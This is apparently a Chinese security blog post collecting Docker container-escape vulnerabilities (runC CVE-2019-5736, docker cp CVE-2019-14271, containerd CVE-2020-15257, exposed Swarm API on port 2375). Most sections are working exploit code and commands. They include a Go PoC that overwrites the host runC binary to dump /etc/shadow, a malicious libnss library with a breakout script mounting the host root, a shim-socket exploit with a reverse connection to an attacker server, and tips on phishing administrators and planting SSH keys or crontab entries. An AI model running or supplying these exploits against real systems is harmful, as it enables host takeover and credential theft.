#  干货 | 常见的Docker容器漏洞总结

小九  [ LemonSec ](javascript:void\(0\);)

**LemonSec** ![]()

微信号 lemon-sec

功能介绍 每日发布安全资讯～

____

__

收录于话题

## **Docker-RunC漏洞致容器逃逸(CVE-2019-5736)**

### 利用条件

  * Docker Version < 18.09.2

  * RunC Version <1.0-rc6

  * 攻击者具有容器文件上传权限 & 管理员使用exec访问容器 || 攻击者具有启动容器权限

### 漏洞原理

攻击者可以将容器中的目标文件替换成指向runC的自己的文件来欺骗runC执行自己。比如目标文件是`/bin/bash`，将它替换成指定解释器路径为`#!/proc/self/exe`的可执行脚本，在容器中执行`/bin/bash`时将执行`/proc/self/exe`，它指向host上的runC文件。然后攻击者可以继续写入`/proc/self/exe`试图覆盖host上的runC文件。但是一般来说不会成功，因为内核不允许在执行runC时覆盖它。为了解决这个问题，攻击者可以使用O_PATH标志打开`/proc/self/exe`的文件描述符，然后通过`/proc/self/fd/<nr>`使用O_WRONLY标志重新打开文件，并尝试在一个循环中从一个单独的进程写入该文件。当runC退出时覆盖会成功，在此之后，runC可以用来攻击其它容器或host。

### 漏洞POC

  *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   * 

    
    
    package main  
    // Implementation of CVE-2019-5736// Created with help from @singe, @_cablethief, and @feexd.// This commit also helped a ton to understand the vuln// https://github.com/lxc/lxc/commit/6400238d08cdf1ca20d49bafb85f4e224348bf9dimport (  "fmt"  "io/ioutil"  "os"  "strconv"  "strings")  
    // This is the line of shell commands that will execute on the hostvar payload = "#!/bin/bash \n cat /etc/shadow > /tmp/shadow && chmod 777 /tmp/shadow"  
    func main() {  // First we overwrite /bin/sh with the /proc/self/exe interpreter path  fd, err := os.Create("/bin/sh")  if err != nil {    fmt.Println(err)    return  }  fmt.Fprintln(fd, "#!/proc/self/exe")  err = fd.Close()  if err != nil {    fmt.Println(err)    return  }  fmt.Println("[+] Overwritten /bin/sh successfully")  
      // Loop through all processes to find one whose cmdline includes runcinit  // This will be the process created by runc  var found int  for found == 0 {    pids, err := ioutil.ReadDir("/proc")    if err != nil {      fmt.Println(err)      return    }    for _, f := range pids {      fbytes, _ := ioutil.ReadFile("/proc/" + f.Name() + "/cmdline")      fstring := string(fbytes)      if strings.Contains(fstring, "runc") {        fmt.Println("[+] Found the PID:", f.Name())        found, err = strconv.Atoi(f.Name())        if err != nil {          fmt.Println(err)          return        }      }    }  }  
      // We will use the pid to get a file handle for runc on the host.  var handleFd = -1  for handleFd == -1 {    // Note, you do not need to use the O_PATH flag for the exploit to work.    handle, _ := os.OpenFile("/proc/"+strconv.Itoa(found)+"/exe", os.O_RDONLY, 0777)    if int(handle.Fd()) > 0 {      handleFd = int(handle.Fd())    }  }  fmt.Println("[+] Successfully got the file handle")  
      // Now that we have the file handle, lets write to the runc binary and overwrite it  // It will maintain it's executable flag  for {    writeHandle, _ := os.OpenFile("/proc/self/fd/"+strconv.Itoa(handleFd), os.O_WRONLY|os.O_TRUNC, 0700)    if int(writeHandle.Fd()) > 0 {      fmt.Println("[+] Successfully got write handle", writeHandle)      writeHandle.Write([]byte(payload))      return    }  }}

### 漏洞利用

  *   *   *   * 

    
    
    #攻击者在容器内执行CGO_ENABLED=0 GOOS=linux GOARCH=amd64 go build main.go #编译POCchmod 777 main./main #执行Payload

### 后续可结合钓鱼邮件等手法，等待运维人员去通过exec访问容器的/bin/bash。使用如下命令：

  * 

    
    
    sudo docker exec -it  cafa20cfb0f9 /bin/sh

> ref:
>
> https://github.com/Frichetten/CVE-2019-5736-PoC
>
> https://www.anquanke.com/post/id/170762

##  **Docker-cp漏洞致容器逃逸(CVE-CVE-2019-14271)**

### 利用条件

  * Docker Version == 19.03 && <19.03.1

### 漏洞原理

Docker采用Golang编写，更具体一些，存在漏洞的Docker版本采用Go
v1.11编译。在这个版本中，包含嵌入式C代码（`cgo`）的某些package会在运行时动态加载共享库。这些package包括`net`及`os/user`，`docker-
tar`都用到了这两个package，会在运行时动态加载一些`libnss_*.so`库。正常情况下，程序库会从宿主机的文件系统中加载，然而由于`docker-
tar`会`chroot`到容器中，因此会从容器的文件系统中加载这些库。这意味着`docker-tar`会加载并执行受容器控制的代码。

### 漏洞POC

恶意so：libnss_files.so by C

  *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   * 

    
    
    #include ...  
    #define ORIGINAL_LIBNSS "/original_libnss_files.so.2"#define LIBNSS_PATH "/lib/x86_64-linux-gnu/libnss_files.so.2"  
    bool is_priviliged();  
    __attribute__ ((constructor)) void run_at_link(void){     char * argv_break[2];     if (!is_priviliged())           return;  
         rename(ORIGINAL_LIBNSS, LIBNSS_PATH);     fprintf(log_fp, "switched back to the original libnss_file.so");  
         if (!fork())     {  
               // Child runs breakout           argv_break[0] = strdup("/breakout");           argv_break[1] = NULL;           execve("/breakout", argv_break, NULL);     }     else           wait(NULL); // Wait for child  
         return;}bool is_priviliged(){     FILE * proc_file = fopen("/proc/self/exe", "r");     if (proc_file != NULL)     {           fclose(proc_file);           return false; // can open so /proc exists, not privileged     }     return true; // we're running in the context of docker-tar}

breakout脚本

  *   *   *   *   *   *   *   *   *   * 

    
    
    #!/bin/bash  
    umount /host_fs && rm -rf /host_fsmkdir /host_fs  
      
    mount -t proc none /proc     # mount the host's procfs over /proccd /proc/1/root              # chdir to host's rootmount --bind . /host_fs      # mount host root at /host_fsecho "Hello from within the container!" > /host_fs/evil

漏洞利用

> 待完善，暂未复现，大致思路如下

1.编译libnss_files.c为libnss_files.so

2.修改breakout脚本，例如写ssh key 等

3.等待或通过钓鱼邮件等手段，使得运维人员执行`docker cp`

> ref:
>
> https://unit42.paloaltonetworks.com/docker-patched-the-most-severe-copy-
> vulnerability-to-date-with-cve-2019-14271/

##  **Docker-Containerd漏洞致容器逃逸(CVE-2020-15257)**

### 利用条件

  * containerd < 1.4.3

  * containerd < 1.3.9

  * 使用hostnetwork网络模式启动容器 && 使用root用户(UID:0)启动容器

### 漏洞原理

使用hostnetwork网络模式中，容器和主机共享网络命名空间，因此在容器内可以访问host特定的socket文件(shim.sock)。可通过启动一个新的容器，该容器挂在host目录到容器的/host目录，即可实现对host完全的读写。

### 漏洞POC

  *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   * 

    
    
    package main  
    import (    "context"    "errors"    "io/ioutil"    "log"    "net"    "regexp"    "strings"  
        "github.com/containerd/ttrpc"    "github.com/gogo/protobuf/types")  
    func exp(sock string) bool {    sock = strings.Replace(sock, "@", "", -1)    conn, err := net.Dial("unix", "\x00"+sock)    if err != nil {        log.Println(err)        return false    }  
        client := ttrpc.NewClient(conn)    shimClient := NewShimClient(client)    ctx := context.Background()    info, err := shimClient.ShimInfo(ctx, &types.Empty{})    if err != nil {        log.Println("rpc error:", err)        return false    }  
        log.Println("shim pid:", info.ShimPid)    return true}  
    func getShimSockets() ([][]byte, error) {    re, err := regexp.Compile("@/containerd-shim/.*\\.sock")    if err != nil {        return nil, err    }    data, err := ioutil.ReadFile("/proc/net/unix")    matches := re.FindAll(data, -1)    if matches == nil {        return nil, errors.New("Cannot find vulnerable socket")    }    return matches, nil}  
    func main() {    matchset := make(map[string]bool)    socks, err := getShimSockets()    if err != nil {        log.Fatalln(err)    }    for _, b := range socks {        sockname := string(b)        if _, ok := matchset[sockname]; ok {            continue        }        log.Println("try socket:", sockname)        matchset[sockname] = true        if exp(sockname) {            break        }    }  
        return}

### 漏洞利用

1.下载容器渗透工具包

https://github.com/cdk-team/CDK/releases/tag/v1.0.1

2.在服务器NC监听端口

3.

  *   * 

    
    
    chmod +x cdk_linux_amd64./cdk_linux_amd64 run shim-pwn <自己服务器IP> <NC端口>

> ref:
>
> https://www.cdxy.me/?p=837
>
> https://zhuanlan.zhihu.com/p/332334413

##  **Docker-Swarm未授权访问致命令执行**

### 利用条件

  * 使用Docker Swarm并且未对2375端口访问加任何限制访问措施

### 漏洞原理

在使用Docker Swarm的时候，管理的Docker 节点上会开放一个TCP端口2375，绑定在0.0.0.0上，http访问会返回 404 page
not found ，其实这是 Docker Remote API，可以执行Docker命令，比如访问
http://host:2375/containers/json 会返回服务器当前运行的 container列表，和在Docker CLI上执行Docker
ps的效果一样，其他操作比如创建/删除container，拉取image等操作也都可以通过API调用完成。

### 漏洞POC

  * 

    
    
    docker -H tcp://x.x.x.x:2375 ps

### 漏洞利用

可通过挂载host目录，之后使用crontab或者写ssh key来利用。

  

  * 

    
    
    转自：HACK学习呀

  

  

  **热文推荐  ** ** **

  * [蓝队应急响应姿势之Linux](http://mp.weixin.qq.com/s?__biz=MzUyMTA0MjQ4NA==&mid=2247523380&idx=1&sn=27acf248b4bbce96e2e40e193b32f0c9&chksm=f9e3f36fce947a79b416e30442009c3de226d98422bd0fb8cbcc54a66c303ab99b4d3f9bbb05&scene=21#wechat_redirect)  

  * [通过DNSLOG回显验证漏洞](http://mp.weixin.qq.com/s?__biz=MzUyMTA0MjQ4NA==&mid=2247523485&idx=1&sn=2825827e55c1c9264041744a00688caf&chksm=f9e3f3c6ce947ad0c129566e5952ac23c990cf0428704df1a51526d8db6adbc47f998ee96eb4&scene=21#wechat_redirect)  

  * [记一次服务器被种挖矿溯源](http://mp.weixin.qq.com/s?__biz=MzUyMTA0MjQ4NA==&mid=2247523441&idx=2&sn=94c6fae1f131c991d82263cb6a8c820b&chksm=f9e3f32ace947a3cdae52cf4cdfc9169ecf2b801f6b0fc2312801d73846d28b36d4ba47cb671&scene=21#wechat_redirect)  

  * [内网渗透初探 | 小白简单学习内网渗透](http://mp.weixin.qq.com/s?__biz=MzUyMTA0MjQ4NA==&mid=2247523346&idx=1&sn=4bf01626aa7457c9f9255dc088a738b4&chksm=f9e3f349ce947a5f934329a78177b9ce85e625a36039008eead2fe35cbad5e96a991569d0b80&scene=21#wechat_redirect)  

  * [实战|通过恶意 pdf 执行 xss 漏洞](http://mp.weixin.qq.com/s?__biz=MzUyMTA0MjQ4NA==&mid=2247523274&idx=1&sn=89290e2b7a8e408ff62a657ef71c8594&chksm=f9e3f491ce947d8702eda190e8d4f7ea2e3721549c27a2f768c3256de170f1fd0c99e817e0fb&scene=21#wechat_redirect)  

  * [免杀技术有一套（免杀方法大集结）(Anti-AntiVirus)](http://mp.weixin.qq.com/s?__biz=MzUyMTA0MjQ4NA==&mid=2247523189&idx=1&sn=44ea2c9a59a07847e1efb1da01583883&chksm=f9e3f42ece947d3890eb74e4d5fc60364710b83bd4669344a74c630ac78f689b1248a2208082&scene=21#wechat_redirect)  

  * [内网渗透之内网信息查看常用命令](http://mp.weixin.qq.com/s?__biz=MzUyMTA0MjQ4NA==&mid=2247522979&idx=1&sn=894ac98a85ae7e23312b0188b8784278&chksm=f9e3f5f8ce947cee823a62ae4db34270510cc64772ed8314febf177a7660de08c36bedab6267&scene=21#wechat_redirect)  

  * [关于漏洞的基础知识](http://mp.weixin.qq.com/s?__biz=MzUyMTA0MjQ4NA==&mid=2247523083&idx=2&sn=0b162aba30063a4073bad24269a8dc0e&chksm=f9e3f450ce947d4699dfebf0a60a2dade481d8baf5f782350c2125ad6a320f91a2854d027e85&scene=21#wechat_redirect)  

  * [任意账号密码重置的6种方法](http://mp.weixin.qq.com/s?__biz=MzUyMTA0MjQ4NA==&mid=2247522927&idx=1&sn=075ccdb91ae67b7ad2a771aa1d6b43f3&chksm=f9e3f534ce947c220664a938bc42926bee3ca8d07c6e3129795d7c8977948f060b08c0f89739&scene=21#wechat_redirect)  

  * [干货 | 横向移动与域控权限维持方法总汇](http://mp.weixin.qq.com/s?__biz=MzUyMTA0MjQ4NA==&mid=2247522810&idx=2&sn=ed65a8c60c45f9af598178ed20c89896&chksm=f9e3f6a1ce947fb710ff77d8fbd721220b16673953b30eba6b10ad6e86924f6b4b9b2a983e74&scene=21#wechat_redirect)  

  * [手把手教你Linux提权](http://mp.weixin.qq.com/s?__biz=MzUyMTA0MjQ4NA==&mid=2247522500&idx=2&sn=ec74a21ef0a872f7486ccac6772e0b9a&chksm=f9e3f79fce947e89eac9d9077eee8ce74f3ab35a345b1c2194d11b77d5b522be3b269b326ebf&scene=21#wechat_redirect)

  

 ** **欢迎关注LemonSec****

 **觉得不错点个 **“赞”** 、“在看”哦**

预览时标签不可点

收录于话题 #

 个

上一篇 下一篇

微信扫一扫  
关注该公众号

[知道了](javascript:;)

微信扫一扫  
使用小程序

****

[取消](javascript:void\(0\);) [允许](javascript:void\(0\);)

****

[取消](javascript:void\(0\);) [允许](javascript:void\(0\);)

： ， 。   视频 小程序 赞 ，轻点两下取消赞 在看 ，轻点两下取消在看

